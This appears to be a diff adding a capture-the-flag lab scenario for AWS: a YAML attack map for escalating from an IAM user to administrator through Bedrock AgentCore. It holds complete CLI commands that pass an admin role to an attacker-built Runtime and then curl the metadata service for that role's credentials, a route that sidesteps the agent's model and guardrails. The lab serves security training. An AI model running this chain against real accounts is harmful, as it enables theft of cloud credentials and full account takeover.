@@ -1,0 +1,205 @@
+attackMap:
+  nodes:
+    - id: starting-principal
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-bedrock-003-to-admin-starting-user"
+      access:
+        type: assumed-breach-credentials
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could have been
+        obtained through many real-world vectors: phishing a developer and gaining access to
+        their workstation, compromising a browser session, exploiting a vulnerable workload
+        running in this AWS account, discovering credentials in a public S3 bucket, or finding
+        them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user holds iam:PassRole on the target admin role and the full set of
+        bedrock-agentcore permissions needed to create a Runtime, create its endpoint, create
+        a workload identity, and invoke a shell command inside the Runtime's MicroVM:
+        CreateAgentRuntime, CreateAgentRuntimeEndpoint, CreateWorkloadIdentity, and
+        InvokeAgentRuntimeCommand. It also has helpful reconnaissance permissions:
+        iam:ListRoles, iam:GetRole, and bedrock-agentcore:GetAgentRuntime.
+
+    - id: attacker-container-image
+      label: "Attacker Container Image"
+      type: resource
+      subType: ecr-repository
+      isAttackerControlled: true
+      arn: "arn:aws:ecr:{region}:{attacker_account_id}:repository/bedrock-003-runtime-image"
+      description: >
+        This container image is attacker-owned infrastructure, not a victim misconfiguration.
+        The attacker pushes a custom container image to their own ECR repository (or a public
+        registry) and references it when creating the AgentCore Runtime. Because the attacker
+        controls the image, they choose exactly what process runs inside the MicroVM alongside
+        the Runtime agent. For credential extraction via MMDS, the image only needs a shell
+        and curl (or any HTTP client) -- a minimal Alpine or Ubuntu base image is sufficient.
+        The image does not need to implement a real AI agent; InvokeAgentRuntimeCommand
+        executes commands as root in the MicroVM independently of whatever the container
+        process is doing.
+
+    - id: agentcore-runtime
+      label: "AgentCore Runtime"
+      type: resource
+      subType: bedrock-agent
+      arn: "arn:aws:bedrock-agentcore:{region}:{account_id}:runtime/bedrock-003-privesc-runtime"
+      description: >
+        The AgentCore Runtime provisioned by the attacker with the privileged target role as
+        its execution role. The Runtime runs inside a Firecracker MicroVM managed by AWS.
+        AWS assumes the execution role on behalf of the Runtime, and the resulting temporary
+        credentials are vended to any process running inside the MicroVM via the MicroVM
+        Metadata Service (MMDS) at 169.254.169.254 -- AgentCore's equivalent of EC2's IMDS.
+        Because InvokeAgentRuntimeCommand executes commands as root in the MicroVM and
+        bypasses the agent process, model, and guardrails entirely, the attacker can reach
+        the MMDS directly without any cooperation from the agent application.
+
+    - id: target-role
+      label: "Target Admin Role"
+      type: principal
+      subType: iam-role
+      isAdmin: true
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-bedrock-003-to-admin-target-role"
+      description: >
+        This IAM role holds AdministratorAccess and trusts bedrock-agentcore.amazonaws.com
+        as a service principal, allowing it to be passed to an AgentCore Runtime as an
+        execution role. Once the Runtime is provisioned with this role, AWS assumes it on
+        behalf of the Runtime and vends its temporary credentials via MMDS. The attacker
+        extracts AccessKeyId, SecretAccessKey, and Token from the MMDS response and operates
+        as this role locally -- gaining full administrator access to the AWS account.
+
+    - id: ctf-flag
+      label: "CTF Flag"
+      type: resource
+      subType: ssm-parameter
+      isTarget: true
+      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/bedrock-003-to-admin"
+      description: >
+        The CTF flag for this scenario, stored as an SSM Parameter Store parameter. Retrieving
+        it requires ssm:GetParameter on this specific parameter. The AdministratorAccess policy
+        attached to the target role grants this implicitly -- once you are operating as the
+        target role with the extracted MMDS credentials, you can read this parameter to prove
+        end-to-end exploitation.
+
+  edges:
+    - from: starting-principal
+      to: attacker-container-image
+      label: "Push container image"
+      description: >
+        The attacker builds and pushes a container image to their own ECR repository (or any
+        accessible container registry). The image only needs a shell and an HTTP client to
+        reach the MMDS. This step happens entirely outside the victim account and requires no
+        victim IAM permissions.
+      commands:
+        - description: "Authenticate to attacker ECR and push the runtime image"
+          command: |
+            aws ecr get-login-password --region us-east-1 | \
+              docker login --username AWS --password-stdin \
+              {attacker_account_id}.dkr.ecr.us-east-1.amazonaws.com
+            docker build -t bedrock-003-runtime-image .
+            docker tag bedrock-003-runtime-image:latest \
+              {attacker_account_id}.dkr.ecr.us-east-1.amazonaws.com/bedrock-003-runtime-image:latest
+            docker push \
+              {attacker_account_id}.dkr.ecr.us-east-1.amazonaws.com/bedrock-003-runtime-image:latest
+      hints:
+        - "You need a container image for the Runtime. Any minimal image with a shell and curl will do -- the Runtime does not need to implement an actual AI agent for InvokeAgentRuntimeCommand to work."
+        - "The image can live in your own ECR repository, a public registry, or anywhere AgentCore can pull from. The victim account does not need to own the image."
+
+    - from: attacker-container-image
+      to: agentcore-runtime
+      label: "iam:PassRole + bedrock-agentcore:CreateAgentRuntime"
+      description: >
+        Using the starting user credentials, the attacker calls CreateAgentRuntime, passing
+        the target admin role as the executionRoleArn and referencing the attacker-controlled
+        container image. The iam:PassRole permission is what allows the API call to succeed --
+        without it, the call is rejected with an authorization error. AWS provisions a
+        Firecracker MicroVM running the specified container image, and the Runtime assumes the
+        execution role to vend temporary credentials via MMDS. The attacker also calls
+        CreateAgentRuntimeEndpoint and CreateWorkloadIdentity to fully initialize the Runtime.
+        After creation, the attacker polls GetAgentRuntime until the status reaches READY.
+      commands:
+        - description: "Get account ID and build the target role ARN"
+          command: |
+            ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
+            TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-bedrock-003-to-admin-target-role"
+        - description: "Create the AgentCore Runtime with the privileged execution role"
+          command: |
+            RUNTIME_ID=$(aws bedrock-agentcore-control create-agent-runtime \
+              --region us-east-1 \
+              --name bedrock-003-privesc-runtime \
+              --runtime-artifact '{
+                "containerConfiguration": {
+                  "containerUri": "{attacker_account_id}.dkr.ecr.us-east-1.amazonaws.com/bedrock-003-runtime-image:latest"
+                }
+              }' \
+              --role-arn "$TARGET_ROLE_ARN" \
+              --network-configuration '{"networkMode":"PUBLIC"}' \
+              --query 'agentRuntimeId' \
+              --output text)
+            echo "Runtime ID: $RUNTIME_ID"
+        - description: "Create the Runtime endpoint"
+          command: |
+            aws bedrock-agentcore-control create-agent-runtime-endpoint \
+              --region us-east-1 \
+              --agent-runtime-id "$RUNTIME_ID" \
+              --name default
+        - description: "Poll until the Runtime reaches READY state"
+          command: |
+            while true; do
+              STATUS=$(aws bedrock-agentcore-control get-agent-runtime \
+                --region us-east-1 \
+                --agent-runtime-id "$RUNTIME_ID" \
+                --query 'status' --output text)
+              echo "Status: $STATUS"
+              [ "$STATUS" = "READY" ] && break
+              sleep 15
+            done
+      hints:
+        - "The key permission that makes this work is iam:PassRole -- it lets you hand a privileged execution role to a service you are provisioning. Without it, CreateAgentRuntime will be rejected."
+        - "After creation, wait for the Runtime status to reach READY before calling InvokeAgentRuntimeCommand. Poll with GetAgentRuntime every 15 seconds -- initialization typically takes 1-3 minutes."
+        - "Browse to https://pathfinding.cloud/paths/bedrock-003 for technique details."
+
+    - from: agentcore-runtime
+      to: target-role
+      label: "bedrock-agentcore:InvokeAgentRuntimeCommand"
+      description: >
+        With the Runtime in READY state, the attacker calls InvokeAgentRuntimeCommand with a
+        bash command that reads temporary credentials from MMDS. The command requests an
+        IMDSv2 token, then uses it to fetch the execution role name from the MMDS
+        security-credentials path, and finally retrieves the full credential JSON
+        (AccessKeyId, SecretAccessKey, Token) for the target admin role.
+        InvokeAgentRuntimeCommand runs as root inside the MicroVM and bypasses the agent
+        process, model, and any guardrails entirely.
+      commands:
+        - description: "Invoke a shell command to read MMDS credentials from the Runtime MicroVM"
+          command: |
+            CREDS=$(aws bedrock-agentcore invoke-agent-runtime-command \
+              --region us-east-1 \
+              --agent-runtime-id "$RUNTIME_ID" \
+              --command 'TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60"); ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/); curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE' \
+              --query 'output' \
+              --output text)
+            echo "$CREDS"
+        - description: "Export the extracted credentials"
+          command: |
+            export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r '.AccessKeyId')
+            export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r '.SecretAccessKey')
+            export AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r '.Token')
+        - description: "Verify admin access via the extracted credentials"
+          command: "aws sts get-caller-identity"
+      hints: []
+
+    - from: target-role
+      to: ctf-flag
+      label: "Read CTF flag"
+      description: >
+        Using the temporary credentials extracted from MMDS, the attacker now operates as the
+        target admin role. AdministratorAccess grants ssm:GetParameter on all parameters in
+        the account, including the flag parameter. Read the flag to prove end-to-end
+        exploitation of the bedrock-003 privilege escalation path.
+      commands:
+        - description: "Retrieve the CTF flag from SSM Parameter Store"
+          command: "aws ssm get-parameter --name /pathfinding-labs/flags/bedrock-003-to-admin --query 'Parameter.Value' --output text"
+      hints:
+        - "You now hold administrator credentials extracted from the Runtime's MicroVM. The CTF flag lives in SSM Parameter Store under the /pathfinding-labs/flags/ prefix."
+        - "Use ssm:GetParameter with the scenario-specific parameter name to retrieve the flag."
